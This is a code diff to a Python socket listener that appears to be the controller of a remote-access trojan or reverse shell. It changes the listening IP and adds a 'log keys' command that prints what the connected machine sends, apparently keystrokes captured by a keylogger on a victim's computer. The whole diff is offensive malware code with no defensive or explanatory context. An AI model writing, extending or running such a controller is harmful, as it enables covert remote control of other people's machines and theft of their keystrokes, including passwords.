@@ -4,7 +4,7 @@ import sys
 
 sock = st.socket(st.AF_INET,st.SOCK_STREAM)
 sock.setsockopt(st.SOL_SOCKET,st.SO_REUSEADDR,1)
-sock.bind(('192.168.81.112',2222))
+sock.bind(('192.168.6.119',2222))
 sock.listen()
 con,addr = sock.accept()
 
@@ -37,6 +37,9 @@ try:
                 except Exception as e:
                     print(e)
 
+            elif cmd == 'log keys':
+                print(con.recv(1024).decode())
+
             elif cmd in ('quite','exit'):
                 con.close()
                 system('clear')
@@ -50,6 +53,7 @@ try:
                 output = con.recv(1168).decode()
                 print(output,end='\n',flush=True)
                 continue
+
 except Exception as err:
     print(err)
     sys.exit()
